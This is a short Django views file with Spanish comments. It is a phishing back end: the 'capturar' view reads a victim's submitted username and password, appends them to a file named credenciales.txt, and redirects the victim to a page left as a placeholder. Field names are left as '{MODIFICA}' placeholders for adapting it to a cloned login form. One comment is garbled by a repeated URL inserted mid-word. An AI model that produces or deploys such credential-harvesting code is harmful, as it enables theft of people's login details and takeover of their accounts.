from django.shortcuts import render
from django.http import HttpResponseRedirect


def index(request):
    return render(request, 'index.html')


def capturar(request):
    if request.method == 'POST':
        username = request.POST['{MODIFICA}'] #obtenemos el valor name del input
        password = request.POST['{MODIFICA}'] #eEstos dos valores denthttps://google.comhttps://google.comhttps://google.comro del post se deben modificar dependiendo de como se llame el input
        data = open('credenciales.txt', 'a') #La letra a seria el formato para agregar.
        data.write("[+]Usuario = " + username + ':' + "[+]Contraseña = " + password + '\n') #Se agrega el usuario y la contraseña
        data.close()
        return HttpResponseRedirect('{PAGINA DONDE REDIRIGE A LA VICTIMA}')
        

